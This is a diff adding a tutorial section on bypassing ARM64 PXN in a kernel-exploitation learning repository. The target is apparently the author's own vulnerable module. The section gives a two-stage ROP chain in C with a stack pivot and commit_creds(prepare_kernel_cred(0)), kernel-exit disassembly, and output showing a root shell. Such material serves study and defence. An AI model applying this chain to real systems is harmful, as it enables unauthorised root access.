@@ -35,6 +35,9 @@
 	 * [New environment](#new-environment)
 	 * [ARM64 assembly](#arm64-assembly)  
 	 * [Memory debugger](#memory-debugger)  
+* [PXN bypass](#pxn-bypass)  
+	 * [ROP tales in arm64 land](#rop-tales-in-arm64-land)  
+	 * [The two parted ROP chain](#the-two-parted-rop-chain)  
 
 
 ## Creating the environment and the first kernel module
@@ -1331,3 +1334,174 @@ payload->virtual = some_pointer;
 payload->flags = INFO_PUD | INFO_PMD | INFO_PTE;
 ret = (unsigned long)ioctl(fd, 0, (unsigned long)payload);
 ```  
+
+## PXN bypass  
+As my final exploit in this repository (for now) is a simple buffer overflow exploit with PXN protection turned on. It is basically the same as SMEP on x86: we cannot execute code from userspace pages if we are operating in kernel mode. We can bypass this with the well known ROP technique, but our job will be a bit harder. Let's see why.  
+	
+### ROP tales in arm64 land  
+What should our ROP code do? It should call `commit_creds(prepare_kernel_cred(0))` to escalate the privilege of the caller process and then return to userland. Until the commit_creds part it is not much harder than in x86, we just need to look for gadgets which contain the `ldp x29, x30, [sp]` instruction to be able to chain the gadgets together. And one more thing right in the beginning: how do we overwrite the saved return address, if it is placed on the top of the stack (before any buffers)? Well, the only way I found is to overwrite the saved X30 of the function that called this function (in this case __arm64_sys_ioctl). Here's the start of the chain:  
+```C
+//-----------__arm64_sys_ioctl
+buf[off++] = pop_x0;
+buf[off++] = dummy;
+buf[off++] = dummy;
+buf[off++] = dummy;
+buf[off++] = dummy;
+buf[off++] = dummy;
+buf[off++] = dummy;
+```  
+This is the amount of DWords the function will remove from the stack in the end. After this you may think we'll gonna continue with calling the two functions, but sadly it is not that simple. Because of the kernel exit, which is not as trivial as in x86, we won't have enough space on the kernel stack to complete the rop chain. Why is that?  
+On x86 we used swapgs then iretq to return to userspace which took around 6-7 dwords. On arm64 we need to call the part of `finish_ret_to_user` function, which can be found with the address in `/proc/kallsyms` and examined in gdb-multiarch:  
+```
+# cat /proc/kallsyms | grep finish_ret_to_user
+ffff80001001249c t finish_ret_to_user
+``` 
+```asm
+0xffff80001001249c <ret_to_user+16>:	tbz	w19, #21, 0xffff8000100124ac <ret_to_user+32>
+0xffff8000100124a0 <ret_to_user+20>:	mrs	x2, mdscr_el1
+0xffff8000100124a4 <ret_to_user+24>:	orr	x2, x2, #0x1
+0xffff8000100124a8 <ret_to_user+28>:	msr	mdscr_el1, x2
+0xffff8000100124ac <ret_to_user+32>:	nop
+0xffff8000100124b0 <ret_to_user+36>:	nop
+0xffff8000100124b4 <ret_to_user+40>:	nop
+0xffff8000100124b8 <ret_to_user+44>:	nop
+0xffff8000100124bc <ret_to_user+48>:	nop
+0xffff8000100124c0 <ret_to_user+52>:	ldp	x21, x22, [sp, #256]
+0xffff8000100124c4 <ret_to_user+56>:	ldr	x23, [sp, #248]
+0xffff8000100124c8 <ret_to_user+60>:	msr	sp_el0, x23
+0xffff8000100124cc <ret_to_user+64>:	tst	x22, #0x10
+0xffff8000100124d0 <ret_to_user+68>:	b.eq	0xffff8000100124d8 <ret_to_user+76>  // b.none
+0xffff8000100124d4 <ret_to_user+72>:	nop
+0xffff8000100124d8 <ret_to_user+76>:	nop
+0xffff8000100124dc <ret_to_user+80>:	adrp	x1, 0xffff800011681000 <cpu_number>
+0xffff8000100124e0 <ret_to_user+84>:	add	x1, x1, #0x20
+0xffff8000100124e4 <ret_to_user+88>:	mrs	x0, tpidr_el1
+0xffff8000100124e8 <ret_to_user+92>:	ldr	x1, [x1, x0]
+0xffff8000100124ec <ret_to_user+96>:	cbz	x1, 0xffff800010012504 <ret_to_user+120>
+0xffff8000100124f0 <ret_to_user+100>:	ldr	x1, [x28]
+0xffff8000100124f4 <ret_to_user+104>:	tbnz	w1, #25, 0xffff800010012504 <ret_to_user+120>
+0xffff8000100124f8 <ret_to_user+108>:	mov	w0, #0x80007fff            	// #-2147450881
+0xffff8000100124fc <ret_to_user+112>:	mov	w1, #0x0                   	// #0
+0xffff800010012500 <ret_to_user+116>:	nop
+0xffff800010012504 <ret_to_user+120>:	msr	elr_el1, x21
+0xffff800010012508 <ret_to_user+124>:	msr	spsr_el1, x22
+0xffff80001001250c <ret_to_user+128>:	ldp	x0, x1, [sp]
+0xffff800010012510 <ret_to_user+132>:	ldp	x2, x3, [sp, #16]
+0xffff800010012514 <ret_to_user+136>:	ldp	x4, x5, [sp, #32]
+0xffff800010012518 <ret_to_user+140>:	ldp	x6, x7, [sp, #48]
+0xffff80001001251c <ret_to_user+144>:	ldp	x8, x9, [sp, #64]
+0xffff800010012520 <ret_to_user+148>:	ldp	x10, x11, [sp, #80]
+0xffff800010012524 <ret_to_user+152>:	ldp	x12, x13, [sp, #96]
+0xffff800010012528 <ret_to_user+156>:	ldp	x14, x15, [sp, #112]
+0xffff80001001252c <ret_to_user+160>:	ldp	x16, x17, [sp, #128]
+0xffff800010012530 <ret_to_user+164>:	ldp	x18, x19, [sp, #144]
+0xffff800010012534 <ret_to_user+168>:	ldp	x20, x21, [sp, #160]
+0xffff800010012538 <ret_to_user+172>:	ldp	x22, x23, [sp, #176]
+0xffff80001001253c <ret_to_user+176>:	ldp	x24, x25, [sp, #192]
+0xffff800010012540 <ret_to_user+180>:	ldp	x26, x27, [sp, #208]
+0xffff800010012544 <ret_to_user+184>:	ldp	x28, x29, [sp, #224]
+0xffff800010012548 <ret_to_user+188>:	ldr	x30, [sp, #240]
+0xffff80001001254c <ret_to_user+192>:	add	sp, sp, #0x150
+0xffff800010012550 <ret_to_user+196>:	nop
+0xffff800010012554 <ret_to_user+200>:	b.ne	0xffff800010012570 <ret_to_user+228>  // b.any
+0xffff800010012558 <ret_to_user+204>:	msr	far_el1, x30
+0xffff80001001255c <ret_to_user+208>:	mov	x30, #0xfffffbffffffffff    	// #-4398046511105
+0xffff800010012560 <ret_to_user+212>:	movk	x30, #0xfdbf, lsl #16
+0xffff800010012564 <ret_to_user+216>:	movk	x30, #0xa000
+0xffff800010012568 <ret_to_user+220>:	add	x30, x30, #0x7d0
+0xffff80001001256c <ret_to_user+224>:	br	x30
+```  
+As you can see it is quite a big function with many stack manipulations. It basically restores all the necessary registers before returning to user mode. The exact return is after the `br x30` instruction:  
+```asm
+0xfffffbfffdbfa7d0:	adr	x30, 0xfffffbfffdbfa000
+0xfffffbfffdbfa7d4:	msr	vbar_el1, x30
+0xfffffbfffdbfa7d8:	mrs	x30, ttbr1_el1
+0xfffffbfffdbfa7dc:	sub	x30, x30, #0x2, lsl #12
+0xfffffbfffdbfa7e0:	orr	x30, x30, #0x1000000000000
+0xfffffbfffdbfa7e4:	msr	ttbr1_el1, x30
+0xfffffbfffdbfa7e8:	mrs	x30, far_el1
+0xfffffbfffdbfa7ec:	eret
+```  
+The `eret` is the instruction which changes the operation back to EL0. So, now you can see why it takes too much space on the stack to call from ROP. We need to place a value for every register and we cannot really leave that part out because before that part the function sets the `sp_el0`, the `elr_el1` and the `spsr_el1` registers which are important for the returning to userspace. So our only solution is stack pivoting.  
+	
+### The two parted ROP chain  
+Stack pivoting on arm64 is much harder. There are almost no gadgets for that. I was already working on other types of exploits (eBPF, vmalloc) but once I needed to rebuild the kernel, and somehow a magic gadget appeard from the sky: `mov sp, x26; blr x1;`. With this I could finally finish my exploit in a 'simple' way. So I needed to control the x26 register to move the stack pointer to a desired location, and the x1 to be able to continue the ROP chain. With this the ROP chain got separated into two parts: the first part controls the x1 and the x26 registers, then performs the stack pivot, then the second part in the pivoted stack will perform the privilege escalation and the returning to the userspace. This is the first ROP chain:  
+```C
+//-----------__arm64_sys_ioctl
+buf[off++] = pop_x0;
+buf[off++] = dummy;
+buf[off++] = dummy;
+buf[off++] = dummy;
+buf[off++] = dummy;
+buf[off++] = dummy;
+buf[off++] = dummy;// __arm64_sys_ioctl pops until here
+//----------POP X0
+buf[off++] = dummy; // sp -> x29
+buf[off++] = mov_x1_x0_vice_versa; // sp + 0x8 -> x30
+buf[off++] = dummy;
+buf[off++] = pop_x0_pop_x19; // sp + 0x18 -> x0
+//----------MOV X1, X0
+buf[off++] = dummy; // sp -> x29
+buf[off++] = pop_x26; // sp + 0x8 -> x30
+//----------POP X26
+buf[off++] = dummy; // sp -> x29
+buf[off++] = stacklift; // x30
+buf[off++] = dummy;
+buf[off++] = dummy;
+buf[off++] = dummy;
+buf[off++] = dummy;
+buf[off++] = dummy;
+buf[off++] = dummy;
+buf[off++] = stacklift_addr;
+buf[off++] = dummy;
+buf[off++] = dummy;
+buf[off++] = dummy;
+```  
+This controls the address of the gadget we want to use into the x1 register (through the x0), then places the stacklift address into the x26 register, which is the address of the kernel buffer in the module (which we use to overflow). The address is calculated by a leaked address that is always in the same offset from the buffer. Then the stacklift gadget is called, which starts the second ROP chain:  
+```C
+//--------------POP X0, POP X19
+mem[off++] = dummy;
+mem[off++] = blr_x19_pop_x19; // x30
+mem[off++] = prepare_kernel_cred; // x19
+mem[off++] = dummy;
+mem[off++] = dummy;
+mem[off++] = 0x0; // x0
+//--------------BLR X19, POP X19
+mem[off++] = dummy;
+mem[off++] = blr_x19_pop_x19; // x30
+mem[off++] = commit_creds; // x19
+mem[off++] = dummy; // x20
+//--------------BLR X19, POP X19
+mem[off++] = dummy;
+mem[off++] = kernel_exit; // x30
+mem[off++] = dummy; // x19
+mem[off++] = dummy; // x20
+//--------------RET FROM SYSCALL
+mem[off++] = 0x0; // x0
+mem[off++] = 0x0; // x1
+...
+mem[off++] = 0x0; // x29
+mem[off++] = 0x0; // x30 (sp + 0xf0)
+mem[off++] = saved_sp; // -> sp_el0 
+mem[off++] = return_address; // -> elr_el1
+mem[off++] = pstate; // -> spsr_el1
+```  
+Here the first three parts perform the privesc with the two known functions. Basically I placed 0 into X0 (parameter of prepare_kernel_cred), then the address of the first function into x19. Then then ext two parts are the same gadget: both branch to the address in X19, then reads a value from the stakc into X19, and because the returning parameter is in x0, we don't need to move it around, we can just use the same gadget twice. After that comes the return to userspace. There are 31 0x0 values fo all the general puprose registers, then comes three important registers: for saved_sp we need the stack address of the exploit program (see the save_sp function in the code), return_address is the shell opening function (which is broken, see later) and the pstate. For pstate I didn't know what to use, so I wrote 0x0, but it seemed to work.  
+After placing the chains in their place, the escalation starts, and returns us to the shell opening function. However, it didn't want to open the shell. I debugged it a while, and found out, that something is wrong with the kernel stack while trying to open the shell, but the execution works perfectly around the end of main function. So I placed the shell opening there, and it worked.  
+```
+# id
+uid=1000(user) gid=1000 groups=1000
+# ./bof
+[+] Opening device file...
+[+] Trying to read from kernel stack...
+[  104.355087] Stack read
+[+] x30 of outer function: 0xffff8000100237f0
+[+] Stack address: 0xffff800012143c08
+[+] Stack pointer: 0x0000ffffece3b380
+[+] Sending payload...
+[  104.359804] Stack write
+[+] Returned to userland, spawning root shell...
+[+] Privilege level successfully escalated, spawning shell...
+# id
+uid=0(root) gid=0(root)
+```
